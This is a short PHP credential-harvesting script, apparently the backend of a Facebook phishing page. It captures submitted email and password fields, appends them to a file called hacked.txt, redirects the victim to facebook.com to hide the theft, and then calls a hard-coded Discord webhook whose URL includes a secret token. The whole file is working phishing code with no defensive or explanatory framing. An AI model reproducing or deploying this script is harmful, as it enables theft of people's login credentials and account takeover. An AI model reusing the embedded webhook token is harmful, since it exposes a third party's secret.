<?php 

    if($_SERVER['REQUEST_METHOD'] == 'POST') {

            $username = isset($_POST['email']) ? $_POST['email'] : '';
            $password = isset($_POST['password']) ? $_POST['password'] : '';
            
            file_put_contents('./hacked.txt', "USERNAME=$username, PASSWORD=$password\n", FILE_APPEND);
       
            
        header("Location:https://www.facebook.com/");
    

        $url = "https://discord.com/api/webhooks/1214808664179736636/Gotfep7Fhz8AaMmWxnq5vVX8g_4ARxK8aF5dkRzbjvf8AFZshWDvEa9R8wgKMhn_mBqS";
        $headers = [ 'Content-Type: application/json; charset=utf-8' ];
        $POST = [ 'username' => 'Testing BOT', 'content' => 'Testing message' ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
        $response   = curl_exec($ch);
        }

?>